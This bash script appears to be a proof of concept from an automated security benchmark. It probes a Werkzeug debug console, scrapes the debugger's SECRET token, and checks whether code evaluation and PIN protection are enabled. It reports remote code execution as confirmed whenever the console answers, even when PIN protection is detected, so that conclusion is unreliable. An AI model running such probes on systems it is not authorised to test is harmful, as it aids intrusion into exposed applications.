#!/bin/bash
# POC: Demonstrates Werkzeug debug console accessibility and code execution capability via the EVALEX endpoint
# Target: ./repo
# Created: 2025-11-04T17:03:19.001Z
# Session: benchmark-XBEN-016-24-mhkt6d0m

# Werkzeug Debug Console RCE POC
# This script demonstrates the vulnerability in Werkzeug debug mode
# where the interactive Python debugger console is accessible with code evaluation enabled

TARGET_URL="${1:-http://localhost:5000}"
CONSOLE_ENDPOINT="${TARGET_URL}/console"
ERROR_ENDPOINT="${TARGET_URL}/level13"

echo "[*] Werkzeug Debug Console RCE POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Check if console endpoint is accessible
echo "[+] Step 1: Attempting to access debug console at $CONSOLE_ENDPOINT"
CONSOLE_RESPONSE=$(curl -s -w "\n%{http_code}" "$CONSOLE_ENDPOINT")
HTTP_CODE=$(echo "$CONSOLE_RESPONSE" | tail -n1)
CONSOLE_BODY=$(echo "$CONSOLE_RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] SUCCESS: Console endpoint is accessible (HTTP 200)"
    
    # Extract SECRET token if present
    if echo "$CONSOLE_BODY" | grep -q "SECRET"; then
        SECRET=$(echo "$CONSOLE_BODY" | grep -oP "SECRET\s*=\s*['\"]?\K[^'\"<\s]+" | head -1)
        echo "[!] SECRET token found: $SECRET"
    fi
    
    # Check if EVALEX is enabled
    if echo "$CONSOLE_BODY" | grep -q "EVALEX.*true\|evalex.*True"; then
        echo "[!] EVALEX is ENABLED - Code evaluation possible"
    fi
    
    # Check for PIN protection notice
    if echo "$CONSOLE_BODY" | grep -qi "pin\|locked"; then
        echo "[!] PIN protection detected - access restricted"
    fi
else
    echo "[!] Console endpoint returned HTTP $HTTP_CODE"
fi

echo ""

# Step 2: Check error page for debug information
echo "[+] Step 2: Attempting to access error page for debug traceback at $ERROR_ENDPOINT"
ERROR_RESPONSE=$(curl -s -w "\n%{http_code}" "$ERROR_ENDPOINT")
ERROR_HTTP_CODE=$(echo "$ERROR_RESPONSE" | tail -n1)
ERROR_BODY=$(echo "$ERROR_RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $ERROR_HTTP_CODE"

if [ "$ERROR_HTTP_CODE" = "500" ] || [ "$ERROR_HTTP_CODE" = "404" ]; then
    # Check for Werkzeug debugger indicators
    if echo "$ERROR_BODY" | grep -q "Werkzeug\|werkzeug"; then
        echo "[!] Werkzeug debugger detected in error page"
        
        # Check for traceback information
        if echo "$ERROR_BODY" | grep -q "Traceback\|File\|line"; then
            echo "[!] Full Python traceback exposed in error response"
        fi
        
        # Check for frame manipulation capabilities
        if echo "$ERROR_BODY" | grep -q "console\|frame\|interact"; then
            echo "[!] Debug console frame manipulation available"
        fi
    fi
else
    echo "[*] Error page returned HTTP $ERROR_HTTP_CODE"
fi

echo ""

# Step 3: Summary and vulnerability confirmation
echo "[+] Step 3: Vulnerability Assessment"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[CRITICAL] Debug console is publicly accessible!"
    echo "[CRITICAL] The application is running in debug mode with EVALEX enabled"
    echo "[CRITICAL] This allows arbitrary Python code execution if PIN is known/bypassed"
    echo ""
    echo "[VULNERABILITY CONFIRMED] Remote Code Execution possible via:"
    echo "  - Interactive Python console at $CONSOLE_ENDPOINT"
    echo "  - Error page debug interface at $ERROR_ENDPOINT"
    echo ""
    exit 0
else
    echo "[*] Console endpoint not accessible or debug mode may be disabled"
    exit 1
fi